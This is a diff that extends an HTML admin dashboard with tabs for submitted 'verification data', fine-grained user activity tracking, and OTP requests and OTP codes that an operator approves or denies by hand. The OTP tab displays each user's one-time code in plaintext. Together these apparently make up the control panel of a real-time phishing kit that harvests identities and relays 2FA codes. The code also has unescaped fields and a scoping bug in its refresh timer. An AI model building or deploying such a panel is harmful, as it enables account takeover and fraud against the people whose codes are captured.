@@ -177,12 +177,174 @@
             font-style: italic; /* Italic text */
         }
 
+        /* Tab navigation styling */
+        .tabs {
+            display: flex; /* Use flexbox layout */
+            margin-bottom: 20px; /* Space below tabs */
+            background: white; /* White background */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+            overflow: hidden; /* Hide overflow for rounded corners */
+        }
+
+        /* Individual tab button styling */
+        .tab-btn {
+            flex: 1; /* Equal width for all tabs */
+            padding: 15px 20px; /* Padding inside tab */
+            border: none; /* Remove default border */
+            background: white; /* White background */
+            color: #666; /* Gray text color */
+            cursor: pointer; /* Pointer cursor */
+            font-size: 14px; /* Font size */
+            font-weight: 500; /* Medium font weight */
+            transition: all 0.3s ease; /* Smooth transitions */
+            border-right: 1px solid #e9ecef; /* Right border between tabs */
+        }
+
+        /* Remove border from last tab */
+        .tab-btn:last-child {
+            border-right: none; /* Remove right border from last tab */
+        }
+
+        /* Active tab styling */
+        .tab-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); /* Gradient background */
+            color: white; /* White text */
+        }
+
+        /* Tab hover effect */
+        .tab-btn:hover:not(.active) {
+            background-color: #f8f9fa; /* Light gray background on hover */
+            color: #495057; /* Darker text on hover */
+        }
+
+        /* Activity breakdown item styling */
+        .activity-item {
+            display: flex; /* Use flexbox layout */
+            justify-content: space-between; /* Space between label and count */
+            align-items: center; /* Center items vertically */
+            padding: 10px 0; /* Vertical padding */
+            border-bottom: 1px solid #e9ecef; /* Bottom border */
+        }
+
+        /* Remove border from last activity item */
+        .activity-item:last-child {
+            border-bottom: none; /* Remove bottom border from last item */
+        }
+
+        /* Activity item label styling */
+        .activity-label {
+            font-weight: 500; /* Medium font weight */
+            color: #495057; /* Dark gray text */
+            text-transform: capitalize; /* Capitalize first letter */
+        }
+
+        /* Activity item count styling */
+        .activity-count {
+            font-weight: bold; /* Bold text */
+            color: #667eea; /* Purple color */
+            background-color: #f8f9fa; /* Light gray background */
+            padding: 4px 12px; /* Padding around count */
+            border-radius: 20px; /* Rounded pill shape */
+            font-size: 12px; /* Smaller font size */
+        }
+
+        /* Pending badge styling for OTP requests tab */
+        .pending-badge {
+            background-color: #dc3545; /* Red background for urgency */
+            color: white; /* White text */
+            font-size: 11px; /* Small font size */
+            font-weight: bold; /* Bold text */
+            padding: 2px 6px; /* Small padding */
+            border-radius: 10px; /* Rounded corners */
+            margin-left: 5px; /* Space from tab text */
+            min-width: 16px; /* Minimum width */
+            text-align: center; /* Center text */
+            display: inline-block; /* Inline block for positioning */
+        }
+
+        /* Hide badge when count is 0 */
+        .pending-badge.hidden {
+            display: none; /* Hide when no pending requests */
+        }
+
+        /* Action button styling for OTP requests */
+        .action-btn {
+            padding: 4px 8px; /* Small padding */
+            margin: 0 2px; /* Small margin between buttons */
+            border: none; /* No border */
+            border-radius: 4px; /* Rounded corners */
+            font-size: 11px; /* Small font */
+            cursor: pointer; /* Pointer cursor */
+            transition: all 0.2s ease; /* Smooth transitions */
+        }
+
+        /* Approve button styling */
+        .approve-btn {
+            background-color: #28a745; /* Green background */
+            color: white; /* White text */
+        }
+
+        .approve-btn:hover {
+            background-color: #218838; /* Darker green on hover */
+        }
+
+        /* Deny button styling */
+        .deny-btn {
+            background-color: #dc3545; /* Red background */
+            color: white; /* White text */
+        }
+
+        .deny-btn:hover {
+            background-color: #c82333; /* Darker red on hover */
+        }
+
+        /* Status badge styling */
+        .status-badge {
+            padding: 2px 8px; /* Small padding */
+            border-radius: 12px; /* Rounded pill shape */
+            font-size: 11px; /* Small font */
+            font-weight: bold; /* Bold text */
+            text-transform: uppercase; /* Uppercase text */
+        }
+
+        /* Pending status styling */
+        .status-pending {
+            background-color: #ffc107; /* Yellow background */
+            color: #856404; /* Dark yellow text */
+        }
+
+        /* Approved status styling */
+        .status-approved {
+            background-color: #28a745; /* Green background */
+            color: white; /* White text */
+        }
+
+        /* Denied status styling */
+        .status-denied {
+            background-color: #dc3545; /* Red background */
+            color: white; /* White text */
+        }
+
         /* Responsive design for mobile devices */
         @media (max-width: 768px) {
             .header {
                 flex-direction: column; /* Stack header items vertically */
                 text-align: center; /* Center align text */
                 gap: 15px; /* Add gap between stacked items */
+            }
+
+            .tabs {
+                flex-direction: column; /* Stack tabs vertically on mobile */
+            }
+
+            .tab-btn {
+                border-right: none; /* Remove right border on mobile */
+                border-bottom: 1px solid #e9ecef; /* Add bottom border */
+            }
+
+            .tab-btn:last-child {
+                border-bottom: none; /* Remove bottom border from last tab */
             }
 
             .table-container {
@@ -223,8 +385,17 @@
         </div>
     </div>
 
-    <!-- Data table section -->
-    <div class="table-container">
+    <!-- Navigation tabs -->
+    <div class="tabs">
+        <button class="tab-btn active" onclick="showTab('submissions')">Form Submissions</button>
+        <button class="tab-btn" onclick="showTab('activities')">User Activities</button>
+        <button class="tab-btn" onclick="showTab('otp-requests')">OTP Requests <span id="pending-badge" class="pending-badge">0</span></button>
+        <button class="tab-btn" onclick="showTab('otp-verifications')">OTP Verifications <span id="pending-verifications-badge" class="pending-badge">0</span></button>
+        <button class="tab-btn" onclick="showTab('stats')">Activity Statistics</button>
+    </div>
+
+    <!-- Submissions Data table section -->
+    <div class="table-container" id="submissions-container">
         <div class="table-header">
             <h3 style="margin: 0;">Submitted Verification Data</h3>
             <button class="refresh-btn" onclick="loadSubmissions()">Refresh</button>
@@ -259,6 +430,196 @@
         </div>
     </div>
 
+    <!-- User Activities table section -->
+    <div class="table-container" id="activities-container" style="display: none;">
+        <div class="table-header">
+            <h3 style="margin: 0;">User Activity Logs</h3>
+            <div>
+                <select id="activity-filter" onchange="loadActivities()" style="margin-right: 10px; padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.2); color: white;">
+                    <option value="">All Activities</option>
+                    <option value="page_visit">Page Visits</option>
+                    <option value="button_click">Button Clicks</option>
+                    <option value="form_submit">Form Submissions</option>
+                    <option value="input_focus">Input Focus</option>
+                </select>
+                <button class="refresh-btn" onclick="loadActivities()">Refresh</button>
+            </div>
+        </div>
+        
+        <!-- Loading indicator for activities -->
+        <div id="activities-loading" class="loading">Loading activities...</div>
+        
+        <!-- Table for displaying activity data -->
+        <table id="activities-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>User ID</th>
+                    <th>Action Type</th>
+                    <th>Page</th>
+                    <th>Element</th>
+                    <th>IP Address</th>
+                    <th>Timestamp</th>
+                    <th>Details</th>
+                </tr>
+            </thead>
+            <tbody id="activities-body">
+                <!-- Dynamic content will be inserted here -->
+            </tbody>
+        </table>
+        
+        <!-- Pagination for activities -->
+        <div id="activities-pagination" style="padding: 20px; text-align: center; display: none;">
+            <button id="prev-page" onclick="changePage(-1)" disabled>Previous</button>
+            <span id="page-info" style="margin: 0 15px;">Page 1 of 1</span>
+            <button id="next-page" onclick="changePage(1)" disabled>Next</button>
+        </div>
+        
+        <!-- No activities message -->
+        <div id="no-activities" class="no-data" style="display: none;">
+            No activities found.
+        </div>
+    </div>
+
+    <!-- Activity Statistics section -->
+    <div class="table-container" id="stats-container" style="display: none;">
+        <div class="table-header">
+            <h3 style="margin: 0;">Activity Statistics</h3>
+            <button class="refresh-btn" onclick="loadActivityStats()">Refresh</button>
+        </div>
+        
+        <!-- Loading indicator for stats -->
+        <div id="stats-loading" class="loading">Loading statistics...</div>
+        
+        <!-- Statistics content -->
+        <div id="stats-content" style="display: none; padding: 20px;">
+            <!-- Overall stats -->
+            <div class="stats" style="margin-bottom: 30px;">
+                <div class="stat-card">
+                    <span class="stat-number" id="total-activities">0</span>
+                    <div class="stat-label">Total Activities</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" id="unique-users">0</span>
+                    <div class="stat-label">Unique Users</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" id="recent-activities">0</span>
+                    <div class="stat-label">Last 24h</div>
+                </div>
+            </div>
+            
+            <!-- Activity breakdown -->
+            <div style="background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+                <h4 style="margin-top: 0;">Activity Breakdown</h4>
+                <div id="activity-breakdown">
+                    <!-- Dynamic content will be inserted here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP Authorization Requests section -->
+    <div class="table-container" id="otp-requests-container" style="display: none;">
+        <div class="table-header">
+            <h3 style="margin: 0;">OTP Authorization Requests</h3>
+            <div>
+                <select id="otp-status-filter" onchange="loadOtpRequests()" style="margin-right: 10px; padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.2); color: white;">
+                    <option value="pending">Pending Only</option>
+                    <option value="all">All Requests</option>
+                    <option value="approved">Approved</option>
+                    <option value="denied">Denied</option>
+                </select>
+                <button class="refresh-btn" onclick="loadOtpRequests()">Refresh</button>
+            </div>
+        </div>
+        
+        <!-- Loading indicator for OTP requests -->
+        <div id="otp-requests-loading" class="loading">Loading OTP requests...</div>
+        
+        <!-- Table for displaying OTP requests -->
+        <table id="otp-requests-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>User ID</th>
+                    <th>User Name</th>
+                    <th>IP Address</th>
+                    <th>Requested At</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="otp-requests-body">
+                <!-- Dynamic content will be inserted here -->
+            </tbody>
+        </table>
+        
+        <!-- Pagination for OTP requests -->
+        <div id="otp-requests-pagination" style="padding: 20px; text-align: center; display: none;">
+            <button id="otp-prev-page" onclick="changeOtpPage(-1)" disabled>Previous</button>
+            <span id="otp-page-info" style="margin: 0 15px;">Page 1 of 1</span>
+            <button id="otp-next-page" onclick="changeOtpPage(1)" disabled>Next</button>
+        </div>
+        
+        <!-- No OTP requests message -->
+        <div id="no-otp-requests" class="no-data" style="display: none;">
+            No OTP requests found.
+        </div>
+    </div>
+
+    <!-- OTP Verification Requests section -->
+    <div class="table-container" id="otp-verifications-container" style="display: none;">
+        <div class="table-header">
+            <h3 style="margin: 0;">OTP Verification Requests</h3>
+            <div>
+                <select id="otp-verification-status-filter" onchange="loadOtpVerifications()" style="margin-right: 10px; padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.2); color: white;">
+                    <option value="pending">Pending Only</option>
+                    <option value="all">All Requests</option>
+                    <option value="approved">Approved</option>
+                    <option value="denied">Denied</option>
+                </select>
+                <button class="refresh-btn" onclick="loadOtpVerifications()">Refresh</button>
+            </div>
+        </div>
+        
+        <!-- Loading indicator for OTP verifications -->
+        <div id="otp-verifications-loading" class="loading">Loading OTP verifications...</div>
+        
+        <!-- Table for displaying OTP verification requests -->
+        <table id="otp-verifications-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>User ID</th>
+                    <th>OTP Code</th>
+                    <th>IP Address</th>
+                    <th>Submitted At</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="otp-verifications-body">
+                <!-- Dynamic content will be inserted here -->
+            </tbody>
+        </table>
+        
+        <!-- Pagination for OTP verifications -->
+        <div id="otp-verifications-pagination" style="padding: 20px; text-align: center; display: none;">
+            <button id="otp-verifications-prev-page" onclick="changeOtpVerificationPage(-1)" disabled>Previous</button>
+            <span id="otp-verifications-page-info" style="margin: 0 15px;">Page 1 of 1</span>
+            <button id="otp-verifications-next-page" onclick="changeOtpVerificationPage(1)" disabled>Next</button>
+        </div>
+        
+        <!-- No OTP verifications message -->
+        <div id="no-otp-verifications" class="no-data" style="display: none;">
+            No OTP verification requests found.
+        </div>
+    </div>
+
+    <!-- User Activity Tracking Script -->
+    <script src="/public/tracking.js"></script>
+    
     <!-- JavaScript for dashboard functionality -->
     <script>
         // Function to load and display all submissions
@@ -385,13 +746,580 @@
             });
         }
 
+        // Global variables for pagination
+        let currentPage = 1;
+        let totalPages = 1;
+        
+        // Function to show/hide tabs
+        function showTab(tabName) {
+            // Hide all containers
+            document.getElementById('submissions-container').style.display = 'none';
+            document.getElementById('activities-container').style.display = 'none';
+            document.getElementById('otp-requests-container').style.display = 'none';
+            document.getElementById('otp-verifications-container').style.display = 'none';
+            document.getElementById('stats-container').style.display = 'none';
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // Show selected container and activate corresponding tab
+            if (tabName === 'submissions') {
+                document.getElementById('submissions-container').style.display = 'block';
+                document.querySelectorAll('.tab-btn')[0].classList.add('active');
+                loadSubmissions(); // Load submissions data
+            } else if (tabName === 'activities') {
+                document.getElementById('activities-container').style.display = 'block';
+                document.querySelectorAll('.tab-btn')[1].classList.add('active');
+                loadActivities(); // Load activities data
+            } else if (tabName === 'otp-requests') {
+                document.getElementById('otp-requests-container').style.display = 'block';
+                document.querySelectorAll('.tab-btn')[2].classList.add('active');
+                loadOtpRequests(); // Load OTP requests data
+            } else if (tabName === 'otp-verifications') {
+                document.getElementById('otp-verifications-container').style.display = 'block';
+                document.querySelectorAll('.tab-btn')[3].classList.add('active');
+                loadOtpVerifications(); // Load OTP verification data
+            } else if (tabName === 'stats') {
+                document.getElementById('stats-container').style.display = 'block';
+                document.querySelectorAll('.tab-btn')[4].classList.add('active');
+                loadActivityStats(); // Load statistics data
+            }
+        }
+        
+        // Function to load and display user activities
+        function loadActivities(page = 1) {
+            currentPage = page;
+            const filter = document.getElementById('activity-filter').value;
+            
+            // Show loading indicator and hide table
+            document.getElementById('activities-loading').style.display = 'block';
+            document.getElementById('activities-table').style.display = 'none';
+            document.getElementById('activities-pagination').style.display = 'none';
+            document.getElementById('no-activities').style.display = 'none';
+            
+            // Build query parameters
+            const params = new URLSearchParams({
+                page: page.toString(),
+                per_page: '20' // Show 20 activities per page
+            });
+            
+            if (filter) {
+                params.append('action_type', filter);
+            }
+            
+            // Fetch activities data from API
+            fetch(`/api/admin/activities?${params.toString()}`)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch activities');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Hide loading indicator
+                    document.getElementById('activities-loading').style.display = 'none';
+                    
+                    if (data.activities.length === 0) {
+                        // Show no data message
+                        document.getElementById('no-activities').style.display = 'block';
+                    } else {
+                        // Show table and populate with data
+                        document.getElementById('activities-table').style.display = 'table';
+                        populateActivitiesTable(data.activities);
+                        
+                        // Update pagination
+                        totalPages = data.pages;
+                        updatePagination(data.page, data.pages);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading activities:', error);
+                    document.getElementById('activities-loading').innerHTML = 'Error loading activities. Please try again.';
+                });
+        }
+        
+        // Function to populate the activities table
+        function populateActivitiesTable(activities) {
+            const tbody = document.getElementById('activities-body');
+            tbody.innerHTML = ''; // Clear existing content
+            
+            activities.forEach(activity => {
+                const row = document.createElement('tr');
+                
+                // Format additional data for display
+                let additionalData = '';
+                if (activity.additional_data) {
+                    try {
+                        const data = JSON.parse(activity.additional_data);
+                        additionalData = Object.entries(data)
+                            .map(([key, value]) => `${key}: ${value}`)
+                            .join(', ');
+                    } catch (e) {
+                        additionalData = activity.additional_data;
+                    }
+                }
+                
+                row.innerHTML = `
+                    <td>${activity.id}</td>
+                    <td><span class="sensitive-data">${escapeHtml(activity.user_identifier?.substring(0, 8) || 'Anonymous')}...</span></td>
+                    <td><span style="background-color: #e3f2fd; color: #1976d2; padding: 2px 6px; border-radius: 3px; font-size: 11px;">${escapeHtml(activity.action_type)}</span></td>
+                    <td>${escapeHtml(activity.page)}</td>
+                    <td>${escapeHtml(activity.element_id || 'N/A')}</td>
+                    <td>${escapeHtml(activity.ip_address || 'N/A')}</td>
+                    <td>${formatDate(activity.timestamp)}</td>
+                    <td><span style="font-size: 11px; color: #666;" title="${escapeHtml(additionalData)}">${escapeHtml(additionalData.substring(0, 50))}${additionalData.length > 50 ? '...' : ''}</span></td>
+                `;
+                
+                tbody.appendChild(row);
+            });
+        }
+        
+        // Function to update pagination controls
+        function updatePagination(current, total) {
+            totalPages = total;
+            currentPage = current;
+            
+            document.getElementById('page-info').textContent = `Page ${current} of ${total}`;
+            document.getElementById('prev-page').disabled = current <= 1;
+            document.getElementById('next-page').disabled = current >= total;
+            
+            if (total > 1) {
+                document.getElementById('activities-pagination').style.display = 'block';
+            }
+        }
+        
+        // Function to change page
+        function changePage(direction) {
+            const newPage = currentPage + direction;
+            if (newPage >= 1 && newPage <= totalPages) {
+                loadActivities(newPage);
+            }
+        }
+        
+        // Function to load activity statistics
+        function loadActivityStats() {
+            // Show loading indicator and hide content
+            document.getElementById('stats-loading').style.display = 'block';
+            document.getElementById('stats-content').style.display = 'none';
+            
+            // Fetch statistics data from API
+            fetch('/api/admin/activity-stats')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch statistics');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Hide loading indicator
+                    document.getElementById('stats-loading').style.display = 'none';
+                    
+                    // Show content and populate with data
+                    document.getElementById('stats-content').style.display = 'block';
+                    populateStatistics(data);
+                })
+                .catch(error => {
+                    console.error('Error loading statistics:', error);
+                    document.getElementById('stats-loading').innerHTML = 'Error loading statistics. Please try again.';
+                });
+        }
+        
+        // Global variables for OTP requests pagination
+        let currentOtpPage = 1;
+        let totalOtpPages = 1;
+        
+        // Function to load and display OTP authorization requests
+        function loadOtpRequests(page = 1) {
+            currentOtpPage = page;
+            const filter = document.getElementById('otp-status-filter').value;
+            
+            // Show loading indicator and hide table
+            document.getElementById('otp-requests-loading').style.display = 'block';
+            document.getElementById('otp-requests-table').style.display = 'none';
+            document.getElementById('otp-requests-pagination').style.display = 'none';
+            document.getElementById('no-otp-requests').style.display = 'none';
+            
+            // Build query parameters
+            const params = new URLSearchParams({
+                page: page.toString(),
+                per_page: '10' // Show 10 requests per page
+            });
+            
+            if (filter && filter !== 'all') {
+                params.append('status', filter);
+            }
+            
+            // Fetch OTP requests data from API
+            fetch(`/api/admin/otp-requests?${params.toString()}`)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch OTP requests');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Hide loading indicator
+                    document.getElementById('otp-requests-loading').style.display = 'none';
+                    
+                    // Update pending badge
+                    updatePendingBadge(data.pending_count || 0);
+                    
+                    if (data.requests.length === 0) {
+                        // Show no data message
+                        document.getElementById('no-otp-requests').style.display = 'block';
+                    } else {
+                        // Show table and populate with data
+                        document.getElementById('otp-requests-table').style.display = 'table';
+                        populateOtpRequestsTable(data.requests);
+                        
+                        // Update pagination
+                        totalOtpPages = data.pages;
+                        updateOtpPagination(data.page, data.pages);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading OTP requests:', error);
+                    document.getElementById('otp-requests-loading').innerHTML = 'Error loading OTP requests. Please try again.';
+                });
+        }
+        
+        // Function to populate the OTP requests table
+        function populateOtpRequestsTable(requests) {
+            const tbody = document.getElementById('otp-requests-body');
+            tbody.innerHTML = ''; // Clear existing content
+            
+            requests.forEach(request => {
+                const row = document.createElement('tr');
+                
+                // Create status badge
+                const statusClass = `status-${request.status}`;
+                const statusBadge = `<span class="status-badge ${statusClass}">${request.status}</span>`;
+                
+                // Create action buttons based on status
+                let actionButtons = '';
+                if (request.status === 'pending') {
+                    actionButtons = `
+                        <button class="action-btn approve-btn" onclick="approveOtpRequest(${request.id})">Approve</button>
+                        <button class="action-btn deny-btn" onclick="denyOtpRequest(${request.id})">Deny</button>
+                    `;
+                } else {
+                    actionButtons = `<span style="color: #666; font-size: 11px;">${request.status}</span>`;
+                }
+                
+                // Get user name from submission info if available
+                const userName = request.submission_info ? request.submission_info.fullname : 'N/A';
+                
+                row.innerHTML = `
+                    <td>${request.id}</td>
+                    <td><span class="sensitive-data">${escapeHtml(request.user_identifier?.substring(0, 8) || 'Unknown')}...</span></td>
+                    <td>${escapeHtml(userName)}</td>
+                    <td>${escapeHtml(request.ip_address || 'N/A')}</td>
+                    <td>${formatDate(request.requested_at)}</td>
+                    <td>${statusBadge}</td>
+                    <td>${actionButtons}</td>
+                `;
+                
+                tbody.appendChild(row);
+            });
+        }
+        
+        // Function to update pending badge count
+        function updatePendingBadge(count) {
+            const badge = document.getElementById('pending-badge');
+            badge.textContent = count;
+            
+            if (count > 0) {
+                badge.classList.remove('hidden');
+            } else {
+                badge.classList.add('hidden');
+            }
+        }
+        
+        // Function to update OTP pagination controls
+        function updateOtpPagination(current, total) {
+            totalOtpPages = total;
+            currentOtpPage = current;
+            
+            document.getElementById('otp-page-info').textContent = `Page ${current} of ${total}`;
+            document.getElementById('otp-prev-page').disabled = current <= 1;
+            document.getElementById('otp-next-page').disabled = current >= total;
+            
+            if (total > 1) {
+                document.getElementById('otp-requests-pagination').style.display = 'block';
+            }
+        }
+        
+        // Function to change OTP page
+        function changeOtpPage(direction) {
+            const newPage = currentOtpPage + direction;
+            if (newPage >= 1 && newPage <= totalOtpPages) {
+                loadOtpRequests(newPage);
+            }
+        }
+        
+        // Function to approve OTP request
+        function approveOtpRequest(requestId) {
+            if (!confirm('Are you sure you want to approve this OTP request?')) {
+                return;
+            }
+            
+            const notes = prompt('Optional notes for approval:') || '';
+            
+            processOtpDecision(requestId, 'approve', notes);
+        }
+        
+        // Function to deny OTP request
+        function denyOtpRequest(requestId) {
+            if (!confirm('Are you sure you want to deny this OTP request?')) {
+                return;
+            }
+            
+            const notes = prompt('Reason for denial (optional):') || '';
+            
+            processOtpDecision(requestId, 'deny', notes);
+        }
+        
+        // Function to process OTP approval/denial
+        function processOtpDecision(requestId, decision, notes) {
+            fetch(`/api/admin/otp-requests/${requestId}/decision`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    decision: decision,
+                    notes: notes
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.json().then(err => Promise.reject(err));
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log(`OTP request ${decision}d:`, data);
+                
+                // Show success message
+                alert(`Request ${decision}d successfully!`);
+                
+                // Reload the OTP requests table
+                loadOtpRequests(currentOtpPage);
+            })
+            .catch(error => {
+                console.error(`Error ${decision}ing request:`, error);
+                alert(`Failed to ${decision} request: ${error.error || 'Unknown error'}`);
+            });
+        }
+
+        // Function to populate statistics
+        function populateStatistics(stats) {
+            // Update overall statistics
+            document.getElementById('total-activities').textContent = stats.total_activities || 0;
+            document.getElementById('unique-users').textContent = stats.unique_users || 0;
+            document.getElementById('recent-activities').textContent = stats.recent_activities || 0;
+            
+            // Update activity breakdown
+            const breakdown = document.getElementById('activity-breakdown');
+            breakdown.innerHTML = '';
+            
+            if (stats.action_stats && Object.keys(stats.action_stats).length > 0) {
+                Object.entries(stats.action_stats).forEach(([actionType, count]) => {
+                    const item = document.createElement('div');
+                    item.className = 'activity-item';
+                    item.innerHTML = `
+                        <span class="activity-label">${actionType.replace('_', ' ')}</span>
+                        <span class="activity-count">${count}</span>
+                    `;
+                    breakdown.appendChild(item);
+                });
+            } else {
+                breakdown.innerHTML = '<p style="text-align: center; color: #999; font-style: italic;">No activity data available</p>';
+            }
+        }
+
+        // Function to load and display OTP verification requests
+        function loadOtpVerifications(page = 1) {
+            // Show loading indicator
+            document.getElementById('otp-verifications-loading').style.display = 'block';
+            document.getElementById('otp-verifications-table').style.display = 'none';
+            document.getElementById('no-otp-verifications').style.display = 'none';
+            
+            // Get filter value
+            const statusFilter = document.getElementById('otp-verification-status-filter').value;
+            
+            // Fetch OTP verification requests from backend
+            fetch(`/api/admin/otp-verifications?page=${page}&per_page=10&status=${statusFilter}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Hide loading indicator
+                    document.getElementById('otp-verifications-loading').style.display = 'none';
+                    
+                    if (data.requests && data.requests.length > 0) {
+                        // Show table and populate with data
+                        document.getElementById('otp-verifications-table').style.display = 'table';
+                        populateOtpVerificationsTable(data.requests);
+                        updateOtpVerificationsPagination(data);
+                        updatePendingVerificationsBadge(data.pending_count || 0);
+                    } else {
+                        // Show no data message
+                        document.getElementById('no-otp-verifications').style.display = 'block';
+                        updatePendingVerificationsBadge(0);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading OTP verifications:', error);
+                    document.getElementById('otp-verifications-loading').style.display = 'none';
+                    document.getElementById('no-otp-verifications').style.display = 'block';
+                    document.getElementById('no-otp-verifications').textContent = 'Error loading OTP verifications. Please try again.';
+                });
+        }
+
+        // Function to populate OTP verifications table
+        function populateOtpVerificationsTable(verifications) {
+            const tbody = document.getElementById('otp-verifications-body');
+            tbody.innerHTML = '';
+            
+            verifications.forEach(verification => {
+                const row = document.createElement('tr');
+                
+                // Determine status badge class
+                let statusClass = 'pending';
+                if (verification.status === 'approved') statusClass = 'approved';
+                if (verification.status === 'denied') statusClass = 'denied';
+                
+                row.innerHTML = `
+                    <td>${verification.id}</td>
+                    <td>${verification.user_identifier.substring(0, 8)}...</td>
+                    <td><strong style="color: #4CAF50; font-size: 18px; font-family: monospace; background: #f0f8f0; padding: 4px 8px; border-radius: 4px;">${verification.otp_code}</strong></td>
+                    <td>${verification.ip_address}</td>
+                    <td>${new Date(verification.submitted_at).toLocaleString()}</td>
+                    <td><span class="status-badge ${statusClass}">${verification.status}</span></td>
+                    <td>
+                        ${verification.status === 'pending' ? `
+                            <button class="action-btn approve" onclick="approveOtpVerification(${verification.id})">✓ Approve</button>
+                            <button class="action-btn deny" onclick="denyOtpVerification(${verification.id})">✗ Deny</button>
+                        ` : `
+                            <span style="color: #666; font-style: italic;">
+                                ${verification.status === 'approved' ? 'Approved' : 'Denied'}
+                                ${verification.admin_notes ? `<br><small>${verification.admin_notes}</small>` : ''}
+                            </span>
+                        `}
+                    </td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // Function to update pending verifications badge
+        function updatePendingVerificationsBadge(count) {
+            const badge = document.getElementById('pending-verifications-badge');
+            if (count > 0) {
+                badge.textContent = count;
+                badge.classList.remove('hidden');
+            } else {
+                badge.classList.add('hidden');
+            }
+        }
+
+        // Function to update OTP verifications pagination
+        function updateOtpVerificationsPagination(data) {
+            const pagination = document.getElementById('otp-verifications-pagination');
+            const pageInfo = document.getElementById('otp-verifications-page-info');
+            const prevBtn = document.getElementById('otp-verifications-prev-page');
+            const nextBtn = document.getElementById('otp-verifications-next-page');
+            
+            if (data.pages > 1) {
+                pagination.style.display = 'block';
+                pageInfo.textContent = `Page ${data.page} of ${data.pages}`;
+                prevBtn.disabled = data.page <= 1;
+                nextBtn.disabled = data.page >= data.pages;
+            } else {
+                pagination.style.display = 'none';
+            }
+        }
+
+        // Function to change OTP verifications page
+        function changeOtpVerificationPage(direction) {
+            const currentPage = parseInt(document.getElementById('otp-verifications-page-info').textContent.match(/Page (\d+)/)[1]);
+            const newPage = currentPage + direction;
+            loadOtpVerifications(newPage);
+        }
+
+        // Function to approve OTP verification
+        function approveOtpVerification(verificationId) {
+            const notes = prompt("Optional notes for approval (or leave blank):");
+            if (notes !== null) { // User didn't cancel
+                processOtpVerificationDecision(verificationId, 'approve', notes);
+            }
+        }
+
+        // Function to deny OTP verification
+        function denyOtpVerification(verificationId) {
+            const notes = prompt("Reason for denial (required):");
+            if (notes && notes.trim()) {
+                processOtpVerificationDecision(verificationId, 'deny', notes);
+            } else if (notes !== null) {
+                alert("Please provide a reason for denial");
+            }
+        }
+
+        // Function to process OTP verification decision
+        function processOtpVerificationDecision(verificationId, decision, notes = '') {
+            fetch(`/api/admin/otp-verifications/${verificationId}/decision`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    decision: decision,
+                    notes: notes
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert(`OTP verification ${decision}d successfully!`);
+                    loadOtpVerifications(); // Reload the OTP verifications
+                } else {
+                    alert(`Error: ${data.error}`);
+                }
+            })
+            .catch(error => {
+                console.error('Error processing OTP verification decision:', error);
+                alert('Failed to process OTP verification decision');
+            });
+        }
+
         // Load submissions when page loads
         document.addEventListener('DOMContentLoaded', function() {
             loadSubmissions(); // Load submissions on page load
+            loadOtpRequests(); // Load OTP requests to update pending badge
+            loadOtpVerifications(); // Load OTP verifications to update pending badge
         });
 
-        // Auto-refresh submissions every 30 seconds
-        setInterval(loadSubmissions, 30000); // Refresh every 30 seconds
+        // Auto-refresh current tab every 30 seconds
+        setInterval(() => {
+            const activeTab = document.querySelector('.tab-btn.active');
+            if (activeTab) {
+                const activeIndex = Array.from(document.querySelectorAll('.tab-btn')).indexOf(activeTab);
+                if (activeIndex === 0) loadSubmissions();
+                else if (activeIndex === 1) loadActivities(currentPage);
+                else if (activeIndex === 2) loadOtpRequests(currentOtpPage);
+                else if (activeIndex === 3) loadOtpVerifications(1);
+                else if (activeIndex === 4) loadActivityStats();
+            }
+            
+            // Always update pending badges regardless of active tab
+            if (activeIndex !== 2) { // Don't double-load if OTP requests tab is active
+                loadOtpRequests(1); // Load first page to update badge count
+            }
+            if (activeIndex !== 3) { // Don't double-load if OTP verifications tab is active
+                loadOtpVerifications(1); // Load first page to update badge count
+            }
+        }, 30000);
     </script>
 </body>
 </html>
